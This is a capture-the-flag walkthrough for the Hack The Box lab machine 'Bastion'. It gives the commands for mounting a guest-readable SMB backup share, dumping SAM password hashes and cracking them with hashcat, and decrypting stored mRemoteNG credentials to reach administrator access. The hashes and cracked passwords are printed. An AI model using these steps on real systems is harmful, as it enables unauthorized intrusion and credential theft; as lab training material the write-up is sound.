```Bastion:HTB````

```10.10.10.134```

Nmap scan:
```
port 445,139
``` 

```
apt-get install libguestfs-tools
apt-get install cifs-utils
```
```
mount -t cifs //10.10.10.134/backups -o user=guest,password= /mnt/remote


guestmount --add /mnt/remote/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -v

```

Smbclient
```
smbclient //10.10.10.134/backups
```

On mounting the drive number 2, I was able to access it. I didnot get any flags in there. So, I remember something, SAM and SYSTEM can be used to dump password hashes using :

```
./pwdump.py /root/tools/SYSTEM /root/tools/SAM

```
Which is inside the creddump7 suite , available on github.

Here are the hashdumps

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
``` 

You can crack the hashes via cracksation or hashcat.
```
hashcat -m 1000 --force 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt
```

Here is the cracked hash:
```
26112010952d963c8dc4217daec986d9:bureaulampje
```
Now you can use ssh to connect to the machine to get user shell.

```ssh L4mpje@10.10.10.134
```
Once inside, you have to enumerate and find that there is an application known as mRemoteNG which is located in ProgramFiles(x86). After looking it up, it is vulnerable.

I downloaded the same version. Checked the changelog.txt and found that the version was https://github.com/mRemoteNG/mRemoteNG/releases/tag/v1.76.11 and downloaded it to my windows machine. Transffered the conf file to the windows PC and replaced my original conf file and loaded it. Followed this link:
http://hackersvanguard.com/mremoteng-insecure-password-storage/

Donot change the password like he did. Make the external tool as shown and run it and you will get the password. Or you can use this mRemoteNG cracker script:

https://github.com/kmahyyg/mremoteng-decrypt/blob/master/mremoteng_decrypt.py
The -S is the password string

Here is the command and output.
```
./mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
```
The password is ```Password: thXLHM96BeKL0ER2```

Now ssh as the administrator with this password to have a shell with system privileges.